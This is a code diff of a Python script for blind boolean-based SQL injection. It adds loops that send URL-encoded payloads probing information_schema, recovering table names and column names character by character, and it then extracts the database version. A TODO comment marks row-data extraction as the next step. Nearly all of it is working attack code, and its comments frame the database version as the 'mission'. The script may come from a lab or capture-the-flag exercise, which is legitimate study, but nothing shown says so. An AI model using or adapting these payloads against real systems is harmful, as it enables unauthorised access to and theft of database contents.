@@ -95,18 +95,42 @@ db_table_count = guess_len(
     "DB Table Count: ",
     "'+and+(select+count(*)+from+information_schema.tables+where+table_schema=database())+=", "+%23")
 
+# Dump the tables
 for table_no in range(db_table_count):
     # Get length of table name
     table_name_len = guess_len(
         "Table Name Length: ",
         "'+and+length(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1+offset+" + str(table_no) + "),1))+=",
         "+%23")
-    # Guess table name - hardcoded length because unable to get
+    # Guess table name
     table_name = guess_name(
         "Table Name: ",
         "'+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1+offset+" + str(table_no) + "),",
         "+%23",
         table_name_len, ord('a'), ord('z'))
+    # Guess the field count
+    table_field_count = guess_len(
+        "Table Field Count: ",
+        "'+and+(select+count(column_name)+from+information_schema.columns+where+table_name='" + table_name + "')+=", "+%23")
+
+    # Now same process for field names (guess 'em)
+    for field_no in range(table_field_count):
+        # Guess length of field name
+        field_name_len = guess_len(
+            "Field Name Length: ",
+            "'+and+length(substr((select+column_name+from+information_schema.columns+where+table_name='" +
+            table_name + "'+limit+1+offset+" + str(field_no) + "),1))+=",
+            "+%23")
+        # Guess field name
+        field_name = guess_name(
+            "Field Name: ",
+            "'+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='" +
+            table_name + "'+limit+1+offset+" + str(field_no) + "),",
+            "+%23",
+            field_name_len, ord(' '), ord('z'))
+
+    # TODO: continue same process to extract field data
+
 
 # Finally, do our actual mission (get DB version)
 db_version_name_len = guess_len("DB Version Length: ", "'+and+length(@@version)+=", "+%23")
